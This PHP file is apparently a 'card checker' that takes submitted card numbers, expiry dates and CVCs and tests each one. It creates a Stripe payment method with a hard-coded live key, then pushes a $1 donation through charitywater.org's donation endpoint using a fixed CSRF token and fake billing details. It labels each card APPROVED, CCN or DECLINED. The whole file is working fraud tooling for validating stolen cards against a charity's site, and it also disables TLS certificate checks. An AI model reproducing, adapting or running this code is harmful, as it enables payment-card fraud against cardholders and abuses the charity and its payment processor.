<?php
// stripe1$.php
// Converted from Python to PHP for use with index.php
// Processes card details and returns APPROVED, CCN, or DECLINED status

header('Content-Type: text/plain');

// Constants
$DOMAIN = "https://www.charitywater.org";
$PK = "pk_live_51S4GUbP9nOtSRfTVvoqmYr7VvT8fDx5ABdsUeZ4TCmohz6iZ63ZC7iedfVOL7seMcFBLrz0rd5MDd8ojZnYrWw9A003MzCGQdF";
$CCN_PATTERNS = [
    'security code is incorrect',
    'incorrect_cvc',
    'cvc_check_failed',
    'Gateway Rejected: cvv',
    'Card Issuer Declined CVV',
];

// Helper function to perform HTTP request
function make_request($url, $method = 'POST', $headers = [], $data = [], $timeout = 30) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Equivalent to verify=False in Python
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        return [0, "Request failed: $error"];
    }
    return [$http_code, $response];
}

// Helper function to parse text between two strings
function parseX($data, $start, $end) {
    $start_pos = strpos($data, $start);
    if ($start_pos === false) {
        return null;
    }
    $start_pos += strlen($start);
    $end_pos = strpos($data, $end, $start_pos);
    if ($end_pos === false) {
        return null;
    }
    return substr($data, $start_pos, $end_pos - $start_pos);
}

// Helper function to parse response
function parse_result($result) {
    global $CCN_PATTERNS;
    
    // Try parsing as JSON
    $data = json_decode($result, true);
    if (json_last_error() === JSON_ERROR_NONE) {
        if (isset($data['error'])) {
            $message = is_array($data['error']) ? ($data['error']['message'] ?? 'Unknown error') : $data['error'];
            $code = is_array($data['error']) ? ($data['error']['code'] ?? '') : '';
            return $code ? "DECLINED|$message, $code" : "DECLINED|$message";
        }
        if (isset($data['success']) || (isset($data['status']) && $data['status'] === 'succeeded')) {
            return "APPROVED|Payment successful";
        }
        return "DECLINED|Unknown decline reason";
    }

    // If not JSON, check for CCN or success keywords
    $text = strtolower($result);
    foreach ($CCN_PATTERNS as $pattern) {
        if (strpos($text, $pattern) !== false) {
            return "CCN|$result";
        }
    }
    if (preg_match('/(success|approved|completed|thank you)/i', $text)) {
        return "APPROVED|$result";
    }
    return "DECLINED|$result";
}

// Main card processing function
function check_card($card_number, $exp_month, $exp_year, $cvc) {
    global $DOMAIN, $PK;

    // Normalize year
    $exp_year = strlen($exp_year) === 4 ? substr($exp_year, -2) : $exp_year;

    // Step 1: Create payment method (Stripe)
    $url1 = "https://api.stripe.com/v1/payment_methods";
    $headers1 = [
        'accept: application/json',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://js.stripe.com',
        'referer: https://js.stripe.com/',
        'user-agent: Mozilla/5.0',
    ];
    $data1 = [
        'type' => 'card',
        'billing_details[address][city]' => 'New york',
        'billing_details[address][country]' => 'IN',
        'billing_details[address][line1]' => 'A27 shsh',
        'billing_details[email]' => 'xavhsu27@gmail.com',
        'billing_details[name]' => 'John Smith',
        'card[number]' => $card_number,
        'card[cvc]' => $cvc,
        'card[exp_month]' => $exp_month,
        'card[exp_year]' => $exp_year,
        'key' => $PK,
    ];
    list($status1, $resp1) = make_request($url1, 'POST', $headers1, $data1, 30);
    
    if ($status1 !== 200 && $status1 !== 201) {
        $data = json_decode($resp1, true);
        if (json_last_error() === JSON_ERROR_NONE && isset($data['error'])) {
            $message = $data['error']['message'] ?? 'Unknown error';
            $code = $data['error']['code'] ?? '';
            return $code ? "DECLINED|$message, $code" : "DECLINED|$message";
        }
        return "DECLINED|$resp1";
    }

    $resp1_data = json_decode($resp1, true);
    $pmid = $resp1_data['id'] ?? parseX($resp1, '"id": "', '"');
    if (!$pmid) {
        return "DECLINED|Payment method creation failed";
    }

    // Wait briefly to mimic Python's asyncio.sleep(1)
    usleep(1000000); // 1 second

    // Step 2: Donation request
    $url2 = "$DOMAIN/donate/stripe";
    $headers2 = [
        'accept: */*',
        'content-type: application/x-www-form-urlencoded; charset=UTF-8',
        "origin: $DOMAIN",
        "referer: $DOMAIN/",
        'user-agent: Mozilla/5.0',
        'x-csrf-token: G6M57A4FuXbsZPZSEK0MAEXhL_9EluoMxuHDF8qR5JDhDtqmBmygTdfZJX5x2RQg-yCWAn2llWRv4oGe8yu04A',
        'x-requested-with: XMLHttpRequest',
    ];
    $data2 = [
        'country' => 'us',
        'payment_intent[email]' => 'xavh7272u27@gmail.com',
        'payment_intent[amount]' => '1',
        'payment_intent[currency]' => 'usd',
        'payment_intent[metadata][donation_kind]' => 'water',
        'payment_intent[payment_method]' => $pmid,
        'donation_form[amount]' => '1',
        'donation_form[email]' => 'xavh7272u27@gmail.com',
        'donation_form[name]' => 'John',
        'donation_form[surname]' => 'Smith',
        'donation_form[campaign_id]' => 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[metadata][donation_kind]' => 'water',
        'donation_form[metadata][email_consent_granted]' => 'true',
        'donation_form[address][address_line_1]' => 'A27 shsh',
        'donation_form[address][city]' => 'New york',
        'donation_form[address][country]' => 'IN',
        'donation_form[address][zip]' => '10001',
    ];
    list($status2, $resp2) = make_request($url2, 'POST', $headers2, $data2, 45);
    
    return parse_result($resp2);
}

// Validate input
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "ERROR|Method not allowed";
    exit;
}

$card_number = $_POST['card']['number'] ?? '';
$exp_month = $_POST['card']['exp_month'] ?? '';
$exp_year = $_POST['card']['exp_year'] ?? '';
$cvc = $_POST['card']['cvc'] ?? '';

if (empty($card_number) || empty($exp_month) || empty($exp_year) || empty($cvc)) {
    echo "ERROR|Missing card details";
    exit;
}

if (!preg_match('/^\d{13,19}$/', $card_number) ||
    !preg_match('/^\d{1,2}$/', $exp_month) ||
    !preg_match('/^\d{2,4}$/', $exp_year) ||
    !preg_match('/^\d{3,4}$/', $cvc)) {
    echo "ERROR|Invalid card format";
    exit;
}

// Process the card and output the result
echo check_card($card_number, $exp_month, $exp_year, $cvc);
?>
